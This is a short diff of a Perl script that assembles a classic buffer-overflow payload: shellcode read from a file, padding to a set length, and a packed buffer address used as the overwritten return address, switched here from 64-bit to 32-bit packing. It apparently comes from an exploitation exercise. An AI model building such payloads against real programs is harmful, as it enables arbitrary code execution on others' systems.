@@ -16,11 +16,11 @@ my $shellcode = read_file( $shell_file );
 
 warn hex( $buf_start ), ":", $required_length;
 
-my $padding = "0" x ( $required_length - length($shellcode) + 8);
-my $buf_start_le = pack("Q", hex( $buf_start ) );
+# Replace L with Q for 64bit
+my $buf_start_le = pack("L", hex( $buf_start ) );
+my $padding = "0" x ( $required_length - length($shellcode));
 
-warn "len = $required_length";
+warn "len = $required_length, padding = $padding";
 
 print $shellcode, $padding, $buf_start_le;
-
 
